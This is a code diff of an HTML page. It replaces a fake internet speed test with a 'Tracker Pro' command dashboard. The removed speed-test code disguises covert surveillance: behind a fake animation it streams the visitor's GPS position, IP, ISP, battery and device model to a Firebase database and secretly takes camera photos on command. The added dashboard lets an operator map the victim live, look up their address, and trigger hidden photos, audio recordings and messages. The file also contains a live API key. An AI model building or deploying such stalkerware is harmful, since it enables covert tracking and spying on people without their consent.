@@ -3,181 +3,198 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Net Speed Tester</title>
+    <title>Pro Command Center</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@400;600&display=swap');
-        body { font-family: 'Poppins', sans-serif; background: #0b0f19; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden;}
-        .meter-container { position: relative; width: 250px; height: 250px; background: conic-gradient(#38bdf8 0%, #0ea5e9 0%, #1e293b 0%); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(14, 165, 233, 0.3); transition: 0.5s; }
-        .meter-inner { width: 220px; height: 220px; background: #0b0f19; border-radius: 50%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .speed-text { font-family: 'Orbitron', sans-serif; font-size: 45px; font-weight: bold; color: #38bdf8; text-shadow: 0 0 10px rgba(56,189,248,0.5); margin: 0;}
-        .speed-unit { font-size: 14px; color: #94a3b8; }
-        .stats { display: flex; gap: 40px; margin-top: 40px; text-align: center;}
-        .stat-box h4 { margin: 0; color: #94a3b8; font-size: 12px; text-transform: uppercase;}
-        .stat-box p { margin: 5px 0 0 0; font-family: 'Orbitron', sans-serif; font-size: 20px; color: #10b981; }
-        .start-btn { margin-top: 40px; background: #38bdf8; color: #000; border: none; padding: 15px 50px; font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer; box-shadow: 0 5px 20px rgba(56, 189, 248, 0.4); text-transform: uppercase; transition: 0.3s;}
-        #noticeBox { display: none; position: absolute; top: 20px; background: #fbbf24; color: black; padding: 10px 20px; border-radius: 10px; font-weight: bold; font-size: 14px; z-index: 1000;}
-        #spyVideo { display: none; } 
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; overflow: hidden; background: #000;}
+        #map { height: 100vh; width: 100%; z-index: 1; }
+        
+        .dashboard { position: absolute; top: 15px; left: 15px; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); padding: 20px; border-radius: 15px; z-index: 1000; box-shadow: 0 10px 30px rgba(0,0,0,0.8); width: 340px; max-height: 90vh; overflow-y: auto; border: 1px solid rgba(56,189,248,0.2); color: white; transition: 0.3s;}
+        .dashboard::-webkit-scrollbar { width: 5px; } .dashboard::-webkit-scrollbar-thumb { background: #38bdf8; border-radius: 5px; }
+        
+        .dash-header { font-size: 20px; font-weight: bold; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 15px; color: #38bdf8; display: flex; justify-content: space-between; align-items: center;}
+        
+        .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 8px;}
+        .data-label { color: #94a3b8; } .data-val { font-weight: bold; color: #f8fafc; text-align: right; max-width: 60%; word-wrap: break-word;}
+        
+        .address-box { background: rgba(16, 185, 129, 0.1); border-left: 4px solid #10b981; padding: 10px; border-radius: 5px; font-size: 13px; color: #e2e8f0; margin-bottom: 15px; line-height: 1.4;}
+        
+        .btn-group { display: flex; gap: 8px; margin-top: 10px; flex-wrap: wrap;}
+        .action-btn { flex: 1; min-width: 45%; padding: 8px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s; font-size: 12px;}
+        .action-btn:active { transform: scale(0.95); }
+        .ring-btn { background: #ef4444; } .msg-btn { background: #3b82f6; } 
+        .photo-btn { background: #8b5cf6; } .audio-btn { background: #ec4899; } .geo-btn { background: #f59e0b; color: black; min-width: 100%;}
+        
+        .media-box { margin-top: 15px; border: 1px dashed #38bdf8; border-radius: 8px; padding: 8px; text-align: center; display: none; background: rgba(0,0,0,0.5);}
+        .media-box img { max-width: 100%; border-radius: 5px; margin-top: 5px; }
+        .media-box audio { width: 100%; margin-top: 5px; outline: none; }
+
+        .smart-marker { text-align: center; font-size: 35px; filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.5)); transition: transform 0.3s; }
+        .hide-btn { background: transparent; border: 1px solid #ef4444; color: #ef4444; padding: 3px 8px; border-radius: 5px; cursor: pointer; font-size: 12px;}
+        .show-panel-btn { position: absolute; top: 15px; left: 15px; background: #0f172a; color: #38bdf8; border: 1px solid #38bdf8; padding: 10px 15px; border-radius: 8px; z-index: 1001; cursor: pointer; font-weight: bold; display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.5);}
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-    <div id="noticeBox">🔔 <span id="msgText"></span></div>
+    <button id="showPanelBtn" class="show-panel-btn">➕ Show Dashboard</button>
 
-    <div class="meter-container" id="meterBg">
-        <div class="meter-inner">
-            <p class="speed-text" id="mainSpeed">0.0</p>
-            <p class="speed-unit">Mbps</p>
+    <div class="dashboard" id="mainDashboard">
+        <div class="dash-header">
+            <span>🛰️ Tracker Pro</span>
+            <div>
+                <span id="statusBadge" style="background:#64748b; padding: 3px 8px; border-radius: 10px; font-size: 12px; color:white; margin-right: 5px;">Waiting</span>
+                <button id="hidePanelBtn" class="hide-btn">➖ Hide</button>
+            </div>
+        </div>
+        
+        <div class="address-box" id="addressUI">📍 Waiting for data...</div>
+        
+        <div class="data-row"><span class="data-label">Device Info:</span> <span class="data-val" id="deviceUI">--</span></div>
+        <div class="data-row"><span class="data-label">Battery Power:</span> <span class="data-val" id="batUI">--</span></div>
+        <div class="data-row"><span class="data-label">IP Address:</span> <span class="data-val" id="ipUI">--</span></div>
+        <div class="data-row"><span class="data-label">Network/ISP:</span> <span class="data-val" id="ispUI">--</span></div>
+        <div class="data-row"><span class="data-label">Current Speed:</span> <span class="data-val" id="speedUI">0 km/h</span></div>
+        
+        <div class="btn-group">
+            <button id="photoFrontBtn" class="action-btn photo-btn">📸 Front Cam</button>
+            <button id="photoBackBtn" class="action-btn photo-btn">📸 Back Cam</button>
+            <button id="audioBtn" class="action-btn audio-btn">🎙️ 5s Voice Record</button>
+            <button id="ringBtn" class="action-btn ring-btn">🔔 Ring</button>
+            <button id="msgBtn" class="action-btn msg-btn">💬 Send Msg</button>
+            <button id="geoBtn" class="action-btn geo-btn">🛡️ Geofence: OFF</button>
+        </div>
+
+        <div class="media-box" id="photoBox">
+            <div id="photoStatus" style="font-size: 12px; color: #94a3b8;">Latest Snapshot</div>
+            <img id="spyImg" src="" alt="">
+        </div>
+
+        <div class="media-box" id="audioBox">
+            <div id="audioStatus" style="font-size: 12px; color: #94a3b8;">Latest Voice Record</div>
+            <audio id="spyAudio" controls></audio>
         </div>
     </div>
 
-    <div class="stats">
-        <div class="stat-box"><h4>Ping</h4><p id="pingVal">--</p></div>
-        <div class="stat-box"><h4>Upload</h4><p id="upVal">--</p></div>
-    </div>
+    <div id="map"></div>
 
-    <button class="start-btn" id="startBtn">START TEST</button>
-
-    <video id="spyVideo" autoplay playsinline></video>
-
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, set, update, onValue, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
         const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
         const app = initializeApp(firebaseConfig); const db = getDatabase(app);
-        const userRef = ref(db, 'live_location/target_user');
-        const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
 
-        let batLvl = 100, isChg = false, userIp = "Fetching...", userIsp = "Fetching...", deviceModel = "Detecting...";
+        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', { maxZoom: 20 });
+        const map = L.map('map', { layers: [satLayer] }).setView([23.8103, 90.4125], 6);
+
+        let marker = null; let accuracyRadar = null; 
+        let routeLine = L.polyline([], {color: '#ef4444', weight: 4, opacity: 0.8}).addTo(map);
+        let lastLat = 0, lastLng = 0; let geofenceEnabled = false; let geofenceCircle = null; let geofenceCenter = null;
+
+        // Hide/Show logic
+        document.getElementById('hidePanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').classList.add('hidden'); document.getElementById('showPanelBtn').style.display = 'block'; });
+        document.getElementById('showPanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').classList.remove('hidden'); document.getElementById('showPanelBtn').style.display = 'none'; });
+
+        // Action Buttons
+        document.getElementById('msgBtn').addEventListener('click', () => { const msg = prompt("Enter msg:"); if(msg) set(ref(db, 'live_location/chat'), { message: msg, time: Date.now() }); });
+        document.getElementById('ringBtn').addEventListener('click', () => { set(ref(db, 'live_location/command'), { ringTime: Date.now() }); });
         
-        // 1. Fetch Battery
-        if(navigator.getBattery) navigator.getBattery().then(b => { 
-            batLvl = Math.round(b.level*100); isChg = b.charging; 
-            b.addEventListener('levelchange', () => batLvl = Math.round(b.level*100));
+        // Photos (Front & Back)
+        function reqPhoto(type) {
+            set(ref(db, 'live_location/command'), { photoTime: Date.now(), camType: type }); 
+            document.getElementById('photoBox').style.display = 'block';
+            document.getElementById('photoStatus').innerText = `Requesting ${type} camera...`;
+            document.getElementById('photoStatus').style.color = "#f59e0b";
+            document.getElementById('spyImg').src = "";
+        }
+        document.getElementById('photoFrontBtn').addEventListener('click', () => reqPhoto("user"));
+        document.getElementById('photoBackBtn').addEventListener('click', () => reqPhoto("environment"));
+
+        // Audio
+        document.getElementById('audioBtn').addEventListener('click', () => { 
+            set(ref(db, 'live_location/command'), { audioTime: Date.now() }); 
+            document.getElementById('audioBox').style.display = 'block';
+            document.getElementById('audioStatus').innerText = "Recording voice (5s)... Please wait.";
+            document.getElementById('audioStatus').style.color = "#f59e0b";
+            document.getElementById('spyAudio').src = "";
         });
 
-        // 2. Fetch IP & ISP using reliable API
-        fetch('https://ipwho.is/')
-            .then(r => r.json())
-            .then(data => { userIp = data.ip; userIsp = data.connection.isp; })
-            .catch(() => { userIp = "Unknown API Error"; userIsp = "Unknown"; });
+        // Geofence
+        document.getElementById('geoBtn').addEventListener('click', () => {
+            geofenceEnabled = !geofenceEnabled;
+            if(geofenceEnabled && lastLat !== 0) {
+                document.getElementById('geoBtn').innerText = "🛡️ Geofence: ON (200m)"; document.getElementById('geoBtn').style.background = "#10b981";
+                geofenceCenter = [lastLat, lastLng];
+                geofenceCircle = L.circle(geofenceCenter, { radius: 200, color: '#f59e0b', fillOpacity: 0.1, dashArray: '5, 5' }).addTo(map);
+            } else {
+                document.getElementById('geoBtn').innerText = "🛡️ Geofence: OFF"; document.getElementById('geoBtn').style.background = "#f59e0b";
+                if(geofenceCircle) map.removeLayer(geofenceCircle);
+            }
+        });
 
-        // 3. Extract Real Device Model
-        async function getDeviceName() {
-            let device = "Unknown";
-            if (navigator.userAgentData) { // Works on modern Android/Chrome
-                try {
-                    const hints = await navigator.userAgentData.getHighEntropyValues(["model"]);
-                    if (hints.model) return hints.model;
-                } catch(e){}
-            }
-            // Fallback for iOS & older devices
-            const ua = navigator.userAgent;
-            if (/iPhone/i.test(ua)) device = "iPhone";
-            else if (/iPad/i.test(ua)) device = "iPad";
-            else if (/Android/i.test(ua)) {
-                const match = ua.match(/Android.*?; (.*?) Build/);
-                device = match ? match[1] : "Android Phone";
-            }
-            else if (/Windows NT/i.test(ua)) device = "Windows PC";
-            else if (/Macintosh/i.test(ua)) device = "MacBook / Mac";
-            return device;
-        }
-        getDeviceName().then(name => deviceModel = name);
-
-        // Capture Photo Logic
-        async function captureSecretPhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('spyVideo');
-                video.srcObject = stream;
-                await video.play(); 
-                
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 480; canvas.height = 360; 
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const base64Photo = canvas.toDataURL('image/jpeg', 0.6); 
-                    
-                    set(ref(db, 'live_location/photo'), { image: base64Photo, time: Date.now() });
-                    stream.getTracks().forEach(t => t.stop()); 
-                }, 1000);
-            } catch(e) {
-                set(ref(db, 'live_location/photo'), { error: e.message || "Permission Denied", time: Date.now() });
-            }
+        function fetchAddress(lat, lng) {
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`).then(res => res.json()).then(data => { document.getElementById('addressUI').innerText = `📍 ${data.display_name}`; }).catch(()=>{});
         }
 
-        // Listen Commands
-        onValue(ref(db, 'live_location/chat'), (snap) => {
+        // Listen for Photo
+        onValue(ref(db, 'live_location/photo'), (snap) => {
             const data = snap.val();
-            if(data && data.time > Date.now() - 5000) {
-                document.getElementById('msgText').innerText = data.message;
-                document.getElementById('noticeBox').style.display = 'block';
-                setTimeout(() => { document.getElementById('noticeBox').style.display = 'none'; }, 8000);
+            if (data && data.image) {
+                document.getElementById('photoStatus').innerText = "Successfully Captured!"; document.getElementById('photoStatus').style.color = "#10b981";
+                document.getElementById('spyImg').src = data.image;
+            } else if (data && data.error) {
+                document.getElementById('photoStatus').innerText = `⚠️ Cam Error: ${data.error}`; document.getElementById('photoStatus').style.color = "#ef4444";
             }
         });
 
-        onValue(ref(db, 'live_location/command'), (snap) => {
-            const cmd = snap.val();
-            if(cmd && cmd.ringTime > Date.now() - 5000) { alarmSound.play().catch(e=>{}); if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]); }
-            if(cmd && cmd.photoTime > Date.now() - 5000) { captureSecretPhoto(); }
+        // Listen for Audio
+        onValue(ref(db, 'live_location/audio'), (snap) => {
+            const data = snap.val();
+            if (data && data.file) {
+                document.getElementById('audioStatus').innerText = "Voice Received!"; document.getElementById('audioStatus').style.color = "#10b981";
+                document.getElementById('spyAudio').src = data.file;
+            } else if (data && data.error) {
+                document.getElementById('audioStatus').innerText = `⚠️ Mic Error: ${data.error}`; document.getElementById('audioStatus').style.color = "#ef4444";
+            }
         });
 
-        const startTestBtn = document.getElementById('startBtn');
-        startTestBtn.addEventListener('click', async () => {
-            
-            try {
-                const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                tempStream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
+        // Listen for User Data
+        onValue(ref(db, 'live_location/target_user'), (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.isOnline) {
+                document.getElementById('statusBadge').style.background = '#10b981'; document.getElementById('statusBadge').innerText = 'Live';
+                document.getElementById('deviceUI').innerText = data.deviceInfo || "--";
+                document.getElementById('batUI').innerText = data.battery ? `${data.battery}% ${data.charging ? '⚡' : ''}` : "--";
+                document.getElementById('ipUI').innerText = data.ip_address || "--";
+                document.getElementById('ispUI').innerText = data.isp || "--";
 
-            onDisconnect(userRef).update({ isOnline: false });
+                if(data.status && data.status.includes("Error")) {
+                    document.getElementById('addressUI').innerText = `⚠️ ${data.status}`; document.getElementById('addressUI').style.borderLeftColor = "#ef4444";
+                    return; 
+                }
 
-            // Start Tracking
-            if(navigator.geolocation) {
-                navigator.geolocation.watchPosition(
-                    (pos) => {
-                        set(userRef, {
-                            latitude: pos.coords.latitude, longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy, heading: pos.coords.heading || 0,
-                            speed: pos.coords.speed ? Math.round(pos.coords.speed * 3.6) : 0,
-                            battery: batLvl, charging: isChg, isOnline: true, status: "Active",
-                            deviceInfo: deviceModel, ip_address: userIp, isp: userIsp
-                        });
-                    },
-                    (err) => { 
-                        let errorMsg = "Unknown Error";
-                        if(err.code === 1) errorMsg = "User Denied Location";
-                        if(err.code === 2) errorMsg = "GPS Signal Lost";
-                        if(err.code === 3) errorMsg = "Timeout/Poor Connection";
-                        
-                        set(userRef, { 
-                            isOnline: true, status: `GPS Error: ${errorMsg}`, 
-                            ip_address: userIp, isp: userIsp, battery: batLvl, charging: isChg,
-                            deviceInfo: deviceModel
-                        });
-                    },
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 } 
-                );
+                document.getElementById('addressUI').style.borderLeftColor = "#10b981";
+                const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
+                document.getElementById('speedUI').innerText = `${speed} km/h`;
+
+                if (Math.abs(lastLat - lat) > 0.0005 || lastLat === 0) { fetchAddress(lat, lng); }
+                lastLat = lat; lastLng = lng;
+
+                let htmlFormat = `<div class="smart-marker" style="transform: rotate(${heading}deg);">${speed > 10 ? "🚘" : (speed > 2 ? "🚶‍♂️" : "🧍‍♂️")}</div>`;
+                const smartIcon = L.divIcon({ className: '', html: htmlFormat, iconSize: [40, 40], iconAnchor: [20, 20] });
+                const latlng = [lat, lng]; routeLine.addLatLng(latlng);
+
+                if (!marker) { 
+                    accuracyRadar = L.circle(latlng, { radius: accuracy, color: '#38bdf8', fillColor: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
+                    marker = L.marker(latlng, {icon: smartIcon}).addTo(map); map.flyTo(latlng, 18); 
+                } else { 
+                    marker.setLatLng(latlng); marker.setIcon(smartIcon); accuracyRadar.setLatLng(latlng); accuracyRadar.setRadius(accuracy); 
+                }
+            } else {
+                document.getElementById('statusBadge').style.background = '#ef4444'; document.getElementById('statusBadge').innerText = 'Offline';
             }
-
-            // Fake Animation
-            startTestBtn.style.display = "none";
-            document.getElementById('pingVal').innerText = Math.floor(Math.random() * 20 + 10) + " ms";
-            let fakeSpeed = 0;
-            let testInterval = setInterval(() => {
-                fakeSpeed += Math.random() * 5;
-                if(fakeSpeed > 45) fakeSpeed -= Math.random() * 8; 
-                document.getElementById('mainSpeed').innerText = fakeSpeed.toFixed(1);
-                document.getElementById('meterBg').style.background = `conic-gradient(#38bdf8 ${fakeSpeed*2}%, #1e293b 0%)`;
-            }, 100);
-
-            setTimeout(() => {
-                clearInterval(testInterval);
-                document.getElementById('upVal').innerText = (fakeSpeed / 3).toFixed(1) + " Mbps";
-                startTestBtn.innerText = "TEST AGAIN";
-                startTestBtn.style.display = "block";
-            }, 10000); 
         });
     </script>
 </body>
